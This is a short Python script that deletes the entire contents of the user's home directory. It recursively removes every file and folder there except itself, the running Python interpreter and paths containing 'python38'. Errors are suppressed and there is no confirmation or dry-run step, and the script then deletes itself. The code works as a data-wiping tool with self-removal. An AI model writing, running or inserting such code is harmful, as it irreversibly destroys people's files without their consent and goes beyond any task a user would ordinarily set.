import os
import shutil
import sys
from pathlib import Path

def delete_directory_except(directory, exclude_paths):
    # Convert all paths to absolute paths for accurate comparison
    exclude_paths = {path.resolve() for path in exclude_paths}

    for item in Path(directory).iterdir():
        # Skip if the item is in the exclude list
        if item.resolve() in exclude_paths:
            continue

        # Skip Python-related directories
        if 'python38' in str(item).lower():
            continue

        try:
            if item.is_dir():
                shutil.rmtree(item, ignore_errors=True)
            elif item.is_file() or item.is_symlink():
                item.unlink(missing_ok=True)
        except Exception as e:
            print(f"Could not delete {item}: {e}", file=sys.stderr)

def main():
    user_profile = Path.home()
    script_path = Path(__file__).resolve()
    python_executable = Path(sys.executable).resolve()

    exclude_paths = {user_profile, script_path, python_executable}

    delete_directory_except(user_profile, exclude_paths)

    # Optionally, delete the script itself after everything else has been deleted
    try:
        script_path.unlink(missing_ok=True)
    except Exception as e:
        print(f"Error deleting self: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
